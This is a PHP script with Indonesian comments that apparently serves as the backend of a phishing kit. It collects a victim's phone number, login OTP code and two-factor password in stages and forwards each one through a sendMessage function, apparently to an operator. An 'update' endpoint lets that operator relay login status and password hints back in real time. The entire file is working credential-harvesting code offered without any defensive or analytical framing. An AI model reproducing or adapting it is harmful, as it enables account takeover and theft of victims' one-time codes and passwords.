<?Php
session_start();
header("Content-Type: application/json");

require("_core.php");

$r = array();
$allowedMethod = ["sendCode","sendOtp","sendPassword","update","getStatus"];
if (isset($_POST["method"]) && in_array($_POST["method"], $allowedMethod)) {
    $method = $_POST["method"];

    $tracker = json_decode(file_get_contents("tracker.json"), TRUE);
    switch($method) {
        // STATUS : WAITING, SUCCESS, FAILED
        case "getStatus":
            $phoneN = $_SESSION["phone"];
            if(isset($tracker[$phoneN])) {
                $TX = $tracker[$phoneN];
                $r["result"] = $tracker[$phoneN];
                if($tracker[$phoneN]["status"] == "success") {
                    switch($tracker[$phoneN]["type"]) {
                        case "checkPhone": $_SESSION["state"] = "phone"; break;
                        case "OTP":
                            // KALAU DETAIL SUCCESS, MAKA JADIKAN OTP ? KALAU PASSWORDNEEDED, MAKA 
                            $_SESSION["state"] = $TX["detail"] == "success" ? "success" : ($TX["detail"] == "passwordNeeded" ? "otp" : false);
                            break;
                        case "password": $_SESSION["state"] = "success"; break;
                        default: $x = true; break;
                    }
                }
            }
            break;

        case "sendCode":
            $phoneN = str_replace(" ","", $_POST['phone']);
            $phoneN = str_replace("+","", $phoneN);
            $_SESSION["phone"] = $phoneN;
            $tracker[$phoneN] = array("type" => "checkPhone", "status" => "waiting");
            sendMessage($phoneN);
            break;

        case "sendOtp":
            $OTP = $_POST["otp"];
            $phoneN = $_SESSION["phone"];
            $_SESSION["otp"] = $OTP;
            $tracker[$phoneN] = array("type" => "OTP", "status" => "waiting");
            sendMessage(implode(":", [$phoneN,$OTP]));
            break;

        case "sendPassword":
            $OTP = $_SESSION["otp"];
            $phoneN = $_SESSION["phone"];
            $password = $_POST["password"];
            $tracker[$phoneN] = array("type" => "password", "status" => "waiting");
            sendMessage(implode(":", [$phoneN,$OTP,$password]));
            break;

        case "update":
            $phoneN = $_POST["phone"];
            if (isset($tracker[$phoneN])) {
                $tracker[$phoneN] = array(
                    "type" => $_POST["type"],
                    "status" => $_POST["status"]
                );

                if(isset($_POST["detail"])) {
                    $tracker[$phoneN]["detail"] = $_POST["detail"];
                }

                if(isset($_POST["hint"])) {
                    $tracker[$phoneN]["hint"] = $_POST["hint"];
                    $_SESSION["hint"] = $_POST["hint"];
                }
            } break;


        default:
            // $response
            break;
    }

    file_put_contents("tracker.json", json_encode($tracker, JSON_PRETTY_PRINT));
}

echo json_encode($r, JSON_PRETTY_PRINT);
?>